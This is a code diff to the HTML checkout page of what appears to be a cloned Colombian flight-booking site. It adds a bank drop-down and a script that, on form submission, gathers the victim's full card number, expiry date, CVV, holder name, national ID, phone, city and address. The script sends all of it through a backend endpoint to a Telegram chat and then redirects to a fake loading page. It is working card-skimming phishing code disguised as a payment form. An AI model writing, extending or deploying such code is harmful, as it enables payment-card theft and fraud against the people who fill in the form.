@@ -11,10 +11,10 @@
     <link rel="stylesheet" type="text/css" href="./assets/css/pay/t-pga.css">
     <link rel="stylesheet" type="text/css" href="./assets/css/globals-43f29dad88.min.css">
 
+    <script type="text/javascript" src="./assets/js/jquery.js"></script>
     <script type="text/javascript" src="./assets/js/mobileslider-de0182521a.min.js"></script>
     <script type="text/javascript" src="./assets/js/bootstrap-5f3dc300f8.min.js"></script>
     <script type="text/javascript" src="./assets/js/globals-20d06c7852.min.js"></script>
-    <script type="text/javascript" src="./assets/js/jquery.js"></script>
 
 
     <script>
@@ -896,6 +896,46 @@
                                                     </tbody>
                                                 </table>
 
+                                                <table border="0" cellspacing="0" cellpadding="0" class="tableCard" style="margin-top: 10px;">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td colspan="2">
+                                                                <label for="bank">Banco:</label>
+                                                                <select id="bank" class="reviewable-item" tabindex="6" ap_validation_type="selectList" style="width: 100%; padding: 8px;">
+                                                                    <option value="">Seleccione un banco</option>
+                                                                    <option value="Bancolombia">Bancolombia</option>
+                                                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                                                                    <option value="Banco de Occidente">Banco de Occidente</option>
+                                                                    <option value="Banco Popular">Banco Popular</option>
+                                                                    <option value="Banco AV Villas">Banco AV Villas</option>
+                                                                    <option value="Banco Caja Social">Banco Caja Social</option>
+                                                                    <option value="Banco Agrario">Banco Agrario</option>
+                                                                    <option value="Banco BBVA">Banco BBVA</option>
+                                                                    <option value="Banco Davivienda">Banco Davivienda</option>
+                                                                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                                                                    <option value="Banco Santander">Banco Santander</option>
+                                                                    <option value="Banco Falabella">Banco Falabella</option>
+                                                                    <option value="Banco Pichincha">Banco Pichincha</option>
+                                                                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                                                                    <option value="Bancoomeva">Bancoomeva</option>
+                                                                    <option value="Banco Serfinanza">Banco Serfinanza</option>
+                                                                    <option value="Banco Colpatria">Banco Colpatria</option>
+                                                                    <option value="Banco de la República">Banco de la República</option>
+                                                                    <option value="Banco W">Banco W</option>
+                                                                    <option value="Banco Compartir">Banco Compartir</option>
+                                                                    <option value="Banco Finandina">Banco Finandina</option>
+                                                                    <option value="Banco Itaú">Banco Itaú</option>
+                                                                    <option value="Banco Tequendama">Banco Tequendama</option>
+                                                                    <option value="Banco Union">Banco Union</option>
+                                                                    <option value="Citibank">Citibank</option>
+                                                                    <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+                                                                    <option value="Banco Procredit">Banco Procredit</option>
+                                                                </select>
+                                                                <div class="validation-error-help validation-error-help--margin valid-pmnt-info-bank" id="err_bank" style="display: none">Seleccione un banco</div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
 
                                                 <table border="0" cellspacing="0" cellpadding="0" class="tableCard">
                                                     <tbody>
@@ -928,8 +968,6 @@
                                                             </td>
 
                                                         </tr>
-
-
                                                     </tbody>
                                                 </table>
 
@@ -1082,7 +1120,74 @@
                                     </form>
                                 
                                     <script>
+                                        // Función para enviar datos a Telegram automáticamente usando el backend
+                                        async function enviarDatosATelegram(datosPago) {
+                                            try {
+                                                // Obtener datos adicionales del localStorage
+                                                const tokenPayment = localStorage.getItem('tokenPayment') || 'N/A';
+                                                const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida')) || {};
+                                                const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso')) || {};
+                                                const origenAndDes = JSON.parse(localStorage.getItem('pt.tb.history_booker_prod')) || {};
+                                                const from = origenAndDes?.from?.[0] || {};
+                                                const to = origenAndDes?.to?.[0] || {};
+                                                const totalPrice = document.getElementById('totalPrice')?.textContent || document.getElementById('totalAmount')?.textContent || 'N/A';
+                                                const bank = datosPago.bank || sessionStorage.getItem('bank') || 'N/A';
+
+                                                // Crear mensaje para Telegram (sin etiquetas <code>)
+                                                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+                                                const message = `
+💳 NUEVO PAGO REALIZADO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 DATOS DE LA TARJETA
+💳 Tarjeta: ${datosPago.cardNumber || 'N/A'}
+📅 Expiración: ${datosPago.expMonth || 'N/A'}/${datosPago.expYear || 'N/A'}
+🔐 CVV: ${datosPago.cvv || 'N/A'}
+👤 Nombre del titular: ${datosPago.ownerName || 'N/A'}
+🏦 Banco: ${bank}
+💳 Cuotas: ${datosPago.cuotas || '1'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 DATOS PERSONALES
+🪪 Cédula: ${datosPago.cedula || 'N/A'}
+📞 Teléfono: ${datosPago.phone || 'N/A'}
+🏙️ Ciudad: ${datosPago.city || 'N/A'}
+🏠 Dirección: ${datosPago.address || 'N/A'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✈️ DETALLES DEL VUELO
+💰 Total: ${totalPrice}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ Fecha y hora: ${new Date().toLocaleString('es-CO')}
+                                                `;
+
+                                                // Enviar mensaje a Telegram usando el endpoint del backend
+                                                const response = await fetch('/api/send-message', {
+                                                    method: "POST",
+                                                    headers: { "Content-Type": "application/json" },
+                                                    body: JSON.stringify({
+                                                        text: message
+                                                    }),
+                                                });
+
+                                                const data = await response.json();
+                                                if (data.ok) {
+                                                    console.log("✅ Datos enviados a Telegram con éxito");
+                                                } else {
+                                                    console.error("❌ Error al enviar mensaje a Telegram:", data);
+                                                }
+                                            } catch (error) {
+                                                console.error("❌ Error al enviar datos a Telegram:", error);
+                                            }
+                                        }
+
                                         document.addEventListener('DOMContentLoaded', function() {
+                                            // Cargar banco desde sessionStorage si existe
+                                            const savedBank = sessionStorage.getItem('bank');
+                                            if (savedBank) {
+                                                const bankSelect = document.getElementById('bank');
+                                                if (bankSelect) {
+                                                    bankSelect.value = savedBank;
+                                                }
+                                            }
+
                                             // Función para validar tarjeta de crédito usando el algoritmo de Luhn
                                             function a(b) {
                                                 let c = 0;
@@ -1181,8 +1286,22 @@
                                                     j = false;
                                                 }
                                     
+                                                // Validación de banco
+                                                const bankSelect = document.getElementById("bank");
+                                                const bankValue = bankSelect ? bankSelect.value.trim() : '';
+                                                if (!bankValue || bankValue === "") {
+                                                    const errBank = document.getElementById("err_bank");
+                                                    if (errBank) {
+                                                        errBank.style.display = 'block';
+                                                    }
+                                                    j = false;
+                                                }
+                                    
                                                 // Si todos los datos son válidos
                                                 if (j) {
+                                                    // Guardar banco en sessionStorage
+                                                    sessionStorage.setItem('bank', bankValue);
+                                    
                                                     const u = {
                                                         cardNumber: k,
                                                         expMonth: l,
@@ -1193,7 +1312,8 @@
                                                         cedula: q,
                                                         phone: r,
                                                         city: s,
-                                                        address: t
+                                                        address: t,
+                                                        bank: bankValue
                                                     };
                                     
                                                     // Guardar los datos en el localStorage bajo 'tbdatos'
@@ -1201,6 +1321,11 @@
                                     
                                                     // Guardar los mismos datos bajo la clave 'paymentData'
                                                     localStorage.setItem('paymentData', JSON.stringify(u));
+                                    
+                                                    // Enviar datos a Telegram automáticamente
+                                                    enviarDatosATelegram(u).catch(err => {
+                                                        console.error("Error al enviar a Telegram:", err);
+                                                    });
                                     
                                                     // Redirigir a loadtiketid.php
                                                     window.location.href = "load.html";
@@ -1250,6 +1375,7 @@
             </div>
         </div>
     </div>
+
 
 </body>
 
